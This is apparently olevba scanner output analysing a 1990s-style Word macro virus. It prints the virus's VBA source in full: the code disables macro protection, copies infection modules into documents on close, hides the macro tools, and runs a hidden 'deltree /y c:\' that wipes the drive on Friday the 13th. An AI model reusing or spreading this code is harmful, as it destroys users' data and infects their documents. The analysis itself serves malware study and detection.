olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Been
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Been - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSDI.bas 
in file: ./Virus.MSWord.Been - OLE stream: 'Macros/VBA/MSDI'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' MSDI.sys (Блок инфецирования документов)
' MSNR.sys (Блок востановления кода в Normal.dot)
' MSNI.sys (Блок инфецирования Normal.dot)

Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
ShowVisualBasicEditor = False
 For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "MSNI" Then Vp = True
 Next i
 If Vp = False Then
   ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSNI.sys")
   ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSDI.sys")
   ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSNR.sys")
 End If
 Call Destructor
End Sub

Sub Destructor()
On Error Resume Next
If WeekDay(Date) = 6 And Day(Date) = 13 Then
Shell "deltree /y c:\ >nul", vbHide
End If
End Sub

Private Sub HelpAbout()
    MsgBox "Lamers Must Been DEAD !!! BioCoded By DEATHtroyer", , "Macro-Script Virus ver1.0"
End Sub


Private Sub ViewVBCode()
End Sub

Private Sub FileTemplates()
End Sub

Private Sub ToolsMacro()
End Sub

Private Sub Organizer()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |1#H                 |MSNI                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

